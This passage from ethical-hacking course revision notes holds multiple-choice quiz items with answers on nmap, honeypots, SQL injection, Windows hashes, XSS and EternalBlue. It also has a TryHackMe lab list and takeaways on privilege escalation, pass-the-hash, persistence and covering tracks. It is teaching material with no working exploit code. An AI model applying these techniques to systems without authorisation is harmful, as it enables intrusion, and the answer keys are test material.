A) Scan all ports with version detection
B) Scan common ports only
C) Scan with stealth mode
D) Scan UDP ports

**Answer:** A) Scan all ports with version detection
**Explanation:**
- -sV: Service version detection
- -p-: Scan all 65535 ports (equivalent to -p 1-65535)

---

**Q39: What is a honeypot?**

A) Password storage system
B) Decoy system to detect/analyze attacks
C) Encryption algorithm
D) Firewall rule

**Answer:** B) Decoy system to detect/analyze attacks
**Explanation:** Honeypots are intentionally vulnerable systems designed to attract and study attackers.

---

**Q40: Which is NOT an effective SQL injection mitigation?**

A) Prepared statements
B) Input validation
C) Change database table prefix
D) Parameterized queries

**Answer:** C) Change database table prefix
**Explanation:** Changing table prefixes provides security through obscurity, not true mitigation. Prepared statements and input validation are effective.

---

**Q41: Analyze this Windows hash:**

```
Administrator:500:AAD3B435B51404EEAAD3B435B51404EE:31D6CFE0D16AE931B73C59D7E0C089C0:::
```

What can you determine?

A) RID 500 = Administrator account
B) LM hash is empty (disabled)
C) NTLM hash is empty (blank password)
D) All of the above

**Answer:** D) All of the above
**Explanation:**
- 500: Administrator RID
- AAD3B435B51404EEAAD3B435B51404EE: Empty LM hash
- 31D6CFE0D16AE931B73C59D7E0C089C0: Empty NTLM hash (blank password)

---

**Q42: Which is NOT a text searching tool in Linux?**

A) grep
B) locate
C) ack
D) ripgrep

**Answer:** B) locate
**Explanation:** locate searches for filenames, not file contents. grep, ack, and ripgrep search text within files.

---

**Q43: Which attack is considered client-side?**

A) SQL Injection
B) Cross-Site Scripting (XSS)
C) Buffer Overflow
D) Command Injection

**Answer:** B) Cross-Site Scripting (XSS)
**Explanation:** XSS executes in the victim's browser (client-side). SQL injection and command injection are server-side attacks.

---

**Q44: Which protocol does the EternalBlue exploit target?**

A) HTTP
B) SMB
C) FTP
D) SSH

**Answer:** B) SMB
**Explanation:** EternalBlue (MS17-010) exploits Windows SMB (Server Message Block) protocol.

---

**Q45: Which command CANNOT identify currently logged-in Linux users?**

A) who
B) w
C) last
D) getuid

**Answer:** D) getuid
**Explanation:**
- who: Shows logged-in users
- w: Shows logged-in users with activity
- last: Shows login history
- getuid: C function to get user ID (not a command for listing users)

---

## Recommended TryHackMe Labs

| Room Name | URL | Difficulty | Subscription | Topics Covered |
|-----------|-----|------------|--------------|----------------|
| **Active Directory Basics** | https://tryhackme.com/room/activedirectorybasics | Easy | Free | AD fundamental concepts: domains, trees, forests, trust relationships, users, groups, organizational units |
| **Attacktive Directory** | https://tryhackme.com/room/attacktivedirectory | Medium | Free | Complete AD attack chain: Kerberoasting, AS-REP roasting, pass the hash, privilege escalation |
| **Post-Exploitation Basics** | https://tryhackme.com/room/postexploit | Easy | Subscriber | Post-exploitation techniques: enumeration, maintaining persistence, pivoting, covering tracks |
| **Crack the Hash** | https://tryhackme.com/room/crackthehash | Easy | Free | Practice cracking various hash types: MD5, SHA1, SHA256, NTLM, bcrypt with John and Hashcat |
| **Blue** | https://tryhackme.com/room/blue | Easy | Free | EternalBlue (MS17-010) exploitation on Windows, Metasploit usage, hash dumping with Mimikatz |

---

## Key Takeaways

**Post Exploitation:**
- Planning and OSINT are critical for success
- Multiple privilege escalation vectors exist on every system
- Maintaining persistence requires multiple techniques
- Covering tracks is essential for operational security
- Pivoting enables access to additional network segments

**Active Directory:**
- Centralized management system for Windows networks
- Hierarchical structure: Domains → Trees → Forests
- Domain Controllers manage authentication and authorization
- Trust relationships enable cross-domain access
- Understanding AD structure is crucial for enterprise penetration testing

**Password Attacks:**
- Offline attacks are faster and stealthier than online attacks
- Windows NTLM hashing lacks salt (enables pass-the-hash)
- LM hashing should be disabled (extremely weak)
- Hash cracking requires appropriate tools (John, Hashcat)
- Effective countermeasures: salting, PBKDF2, password policies, MFA

**Privilege Escalation:**
- Enumerate thoroughly before attempting escalation
- Check: SUID binaries, sudo rights, kernel version, cronjobs
- GTFOBins is an essential resource for SUID/sudo exploitation
- Automated scripts are noisy but comprehensive
- Manual enumeration is stealthier but slower

---

**Final Exam Preparation:**
- Review all 12 weeks of material
- Practice on TryHackMe and HackTheBox
- Understand concepts, not just commands
- Know common tools and their purposes
- Practice time management for exam conditions

---

*Week 12 of 12 — UOP M31880 Ethical Hacking*
